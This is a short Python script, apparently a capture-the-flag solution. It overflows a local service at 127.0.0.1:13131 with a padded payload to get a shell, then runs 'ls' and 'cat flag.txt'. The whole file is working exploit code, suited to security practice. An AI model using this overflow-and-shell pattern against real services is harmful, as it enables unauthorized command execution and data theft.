#!/usr/bin/python3
# -*- coding: utf-8 -*-
import socket

host = '127.0.0.1'
port = 13131

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect((host, port))

s = b'a' * 16 + b'\xff\x7f\xec\x1c\n'
r.send(s)
d = r.recv(2048).decode()
print(d)
while('$' not in d):
    d = r.recv(2048).decode()
    print(d)

r.send('ls\n'.encode())
d = r.recv(2048).decode()
print(d)
while('$' not in d):
    d = r.recv(2048).decode()
    print(d)

r.send('cat flag.txt\n'.encode())
d = r.recv(2048).decode()
print(d)
while('$' not in d):
    d = r.recv(2048).decode()
    print(d)

